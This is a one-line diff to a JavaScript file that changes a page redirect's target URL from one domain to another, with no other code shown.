@@ -1,1 +1,1 @@
-window.location.replace("https://simpx.xyz");
+window.location.replace("https://fingdirect.com");
